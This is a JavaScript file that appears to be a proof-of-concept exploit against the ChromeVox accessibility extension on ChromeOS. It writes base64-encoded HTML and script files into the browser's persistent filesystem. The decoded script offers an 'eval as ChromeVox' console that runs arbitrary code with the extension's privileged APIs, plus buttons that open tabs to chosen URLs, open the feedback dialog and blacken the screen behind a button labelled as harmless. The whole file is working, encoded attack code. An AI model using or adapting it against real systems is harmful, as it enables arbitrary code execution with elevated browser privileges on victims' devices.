(async () => {
  const fs = await new Promise(function (resolve) {
    webkitRequestFileSystem(PERSISTENT, 2 * 1024 * 1024, resolve);
  });

  function writeFile(file, data) {
    return new Promise((resolve, reject) => {
      fs.root.getFile(file, { create: true }, function (entry) {
        entry.remove(
          function () {
            fs.root.getFile(file, { create: true }, function (entry) {
              entry.createWriter(function (writer) {
                writer.write(new Blob([data]));
                writer.onwriteend = () => resolve(entry.toURL());
              });
            });
          },
          function () {
            fs.root.getFile(file, { create: true }, function (entry) {
              entry.createWriter(function (writer) {
                writer.write(new Blob([data]));
                writer.onwriteend = () => resolve(entry.toURL());
              });
            });
          }
        );
      });
    });
  }

  const htmlUrl = await writeFile("chromevox.html", atob('PHNjcmlwdCBzcmM9Ii4vdm94LmpzIj48L3NjcmlwdD4='));

  await writeFile("vox.js", atob('b25lcnJvciA9IGFsZXJ0OwoKY29uc3Qgdm94VGVtcGxhdGUgPSBgCjxkaXYgaWQ9InZveF9jb2RlX3J1bm5lciI+CiAgPGgxPmV2YWwgYXMgQ2hyb21lVm94PC9oMT4KICA8aDI+VGhpcyBpcyBqdXN0IGEgcHJvb2Ygb2YgY29uY2VwdCwgYmVsb3cgYXJlIGNocm9tZXZveGVzIHBlcm1pc3Npb25zPC9oMj4KICA8cD5QZXJtaXNzaW9uczogJHtjaHJvbWUucnVudGltZS5nZXRNYW5pZmVzdCgpLnBlcm1pc3Npb25zLmpvaW4oJywgJyl9PC9wPgogIDxwPkV4dGVuc2lvbiBJRDogJHtjaHJvbWUucnVudGltZS5pZH08L3A+PGhyPgogIDx0ZXh0YXJlYSBpZD0iY29kZV9pbnB1dCIgc3R5bGU9IndpZHRoOiA3MCU7IGhlaWdodDogMTUwcHg7IHJlc2l6ZTogYm90aDsiPjwvdGV4dGFyZWE+CiAgPGJ1dHRvbiBpZD0iY29kZV9ydW4iPlJ1bjwvYnV0dG9uPjxocj4KICA8YnV0dG9uIGlkPSJzaG93X2ZlZWRiYWNrIj5TaG93IEZlZWRiYWNrPC9idXR0b24+PGJyPgogIDxidXR0b24gaWQ9ImZ1bm55X2J1dHRvbl9wbHNfY2xpY2siPllvdSBzaG91bGQgdG90YWxseSBjbGljayB0aGlzIG5vdGhpbmcgd2lsbCBoYXBwZW4gdHJ1c3QgbWU8L2J1dHRvbj48YnI+CiAgPGJ1dHRvbiBpZD0iZ2V0X2JhdHRlcnkiPkdldCBCYXR0ZXJ5IHN0YXR1czwvYnV0dG9uPjxicj4KICA8dGV4dGFyZWEgaWQ9InRhYl9vcGVuX3VybCI+PC90ZXh0YXJlYT48YnV0dG9uIGlkPSJ0YWJfb3BlbmVyIj5PcGVuIFVSTCBpbiBuZXcgdGFiPC9idXR0b24+PGJyPgo8L2Rpdj4KYDsKCmNsYXNzIFZveCB7CiAgc3RhdGljIGdldEZTKCkgewogICAgcmV0dXJuIG5ldyBQcm9taXNlKHJlc29sdmUgPT4gewogICAgICB3ZWJraXRSZXF1ZXN0RmlsZVN5c3RlbShURU1QT1JBUlksIDIgKiAxMDI0ICogMTAyNCwgcmVzb2x2ZSk7CiAgICB9KTsKICB9CgogIHN0YXRpYyBhc3luYyB3cml0ZUZpbGUoZnMsIGZpbGVuYW1lLCBkYXRhKSB7CiAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUsIHJlamVjdCkgPT4gewogICAgICBmcy5yb290LmdldEZpbGUoZmlsZW5hbWUsIHsgY3JlYXRlOiB0cnVlIH0sIGVudHJ5ID0+IHsKICAgICAgICBlbnRyeS5yZW1vdmUoKCkgPT4gewogICAgICAgICAgZnMucm9vdC5nZXRGaWxlKGZpbGVuYW1lLCB7IGNyZWF0ZTogdHJ1ZSB9LCBlbnRyeTIgPT4gewogICAgICAgICAgICBlbnRyeTIuY3JlYXRlV3JpdGVyKHdyaXRlciA9PiB7CiAgICAgICAgICAgICAgd3JpdGVyLm9ud3JpdGVlbmQgPSAoKSA9PiByZXNvbHZlKGVudHJ5Mi50b1VSTCgpKTsKICAgICAgICAgICAgICB3cml0ZXIub25lcnJvciA9IHJlamVjdDsKICAgICAgICAgICAgICB3cml0ZXIud3JpdGUobmV3IEJsb2IoW2RhdGFdKSk7CiAgICAgICAgICAgIH0pOwogICAgICAgICAgfSk7CiAgICAgICAgfSk7CiAgICAgIH0pOwogICAgfSk7CiAgfQoKICBzdGF0aWMgYXN5bmMgcnVuQ29kZShjb2RlKSB7CiAgICBjb25zdCBmcyA9IGF3YWl0IFZveC5nZXRGUygpOwogICAgY29uc3QgdXJsID0gYXdhaXQgVm94LndyaXRlRmlsZShmcywgInNyYy5qcyIsIGNvZGUpOwoKICAgIC8vIFJlbW92ZSBleGlzdGluZyBzY3JpcHQgaWYgYW55CiAgICBjb25zdCBvbGRTY3JpcHQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZXZhbHVhdGVfZWxlbSIpOwogICAgaWYgKG9sZFNjcmlwdCkgb2xkU2NyaXB0LnJlbW92ZSgpOwoKICAgIC8vIEFwcGVuZCBuZXcgc2NyaXB0IHdpdGggc3JjIHNldCB0byBmaWxlIFVSTAogICAgY29uc3Qgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7CiAgICBzY3JpcHQuaWQgPSAiZXZhbHVhdGVfZWxlbSI7CiAgICBzY3JpcHQuc3JjID0gdXJsOwogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzY3JpcHQpOwogIH0KCiAgc3RhdGljIGFjdGl2YXRlKCkgewogICAgZG9jdW1lbnQud3JpdGUodm94VGVtcGxhdGUpOwogICAgZG9jdW1lbnQuY2xvc2UoKTsKCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY29kZV9ydW4iKS5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGFzeW5jICgpID0+IHsKICAgICAgY29uc3QgY29kZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb2RlX2lucHV0IikudmFsdWU7CiAgICAgIGF3YWl0IFZveC5ydW5Db2RlKGNvZGUpOwogICAgfSk7CiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgic2hvd19mZWVkYmFjayIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgYXN5bmMgKCkgPT4gewogICAgICBhd2FpdCBWb3gucnVuQ29kZShgY2hyb21lLmZlZWRiYWNrUHJpdmF0ZS5vcGVuRmVlZGJhY2soJ3F1aWNrb2ZmaWNlJyk7YCk7CiAgICB9KTsKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJmdW5ueV9idXR0b25fcGxzX2NsaWNrIikuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBhc3luYyAoKSA9PiB7CiAgICAgIGF3YWl0IFZveC5ydW5Db2RlKGBjaHJvbWUuYWNjZXNzaWJpbGl0eVByaXZhdGUuZGFya2VuU2NyZWVuKHRydWUpO2ApOwogICAgfSk7CiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZ2V0X2JhdHRlcnkiKS5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGFzeW5jICgpID0+IHsKICAgICAgYXdhaXQgVm94LnJ1bkNvZGUoYGNocm9tZS5hY2Nlc3NpYmlsaXR5UHJpdmF0ZS5nZXRCYXR0ZXJ5RGVzY3JpcHRpb24oYWxlcnQpO2ApOwogICAgfSk7CiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidGFiX29wZW5lciIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgYXN5bmMgKCkgPT4gewogICAgICBjb25zdCB0YWJvcGVudXJsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInRhYl9vcGVuX3VybCIpLnZhbHVlOwogICAgICBhd2FpdCBWb3gucnVuQ29kZShgY2hyb21lLnRhYnMuY3JlYXRlKHt9LCAoKSA9PiB7IGNocm9tZS50YWJzLnVwZGF0ZSh7dXJsOiAiYCt0YWJvcGVudXJsK2AifSk7IGNocm9tZS50YWJzLnJlbG9hZCgpOyB9KTtgKTsKICAgIH0pOwogIH0KfQp3aW5kb3cub25sb2FkID0gKCkgPT4gewogIFZveC5hY3RpdmF0ZSgpOwp9Owo='));

  alert(htmlUrl);
})();
